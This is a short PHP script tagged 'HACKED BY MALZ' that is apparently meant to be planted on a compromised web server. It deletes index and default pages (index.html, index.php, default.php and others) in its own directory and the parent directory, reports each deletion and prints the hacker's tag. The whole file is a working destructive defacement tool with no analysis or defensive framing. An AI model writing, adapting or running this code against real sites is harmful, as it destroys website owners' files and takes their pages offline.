<?php
// HACKED BY MALZ - DELETE INDEX FILES
$files = ['index.html', 'index.php', 'index.htm', 'default.html', 'default.php'];
foreach($files as $f) {
    if(file_exists($f)) {
        unlink($f);
        echo "Deleted: $f\n";
    }
    if(file_exists("../$f")) {
        unlink("../$f");
        echo "Deleted: ../$f\n";
    }
}
echo "HACKED BY MALZ";
?>
